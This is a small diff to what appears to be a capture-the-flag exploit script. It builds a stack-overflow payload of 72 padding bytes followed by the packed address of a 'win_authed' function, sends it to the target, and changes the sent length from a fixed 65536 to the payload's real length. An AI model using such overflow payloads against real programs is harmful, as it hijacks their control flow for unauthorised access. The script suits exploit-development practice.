@@ -23,6 +23,6 @@ delta_len = 72
 value = p64(elf.symbols['win_authed'] + 28)
 bytestream = b'A' * delta_len + value
 
-p.sendline(b'65536')
+p.sendline(f'{len(bytestream)}'.encode())
 p.sendline(bytestream)
 p.interactive()
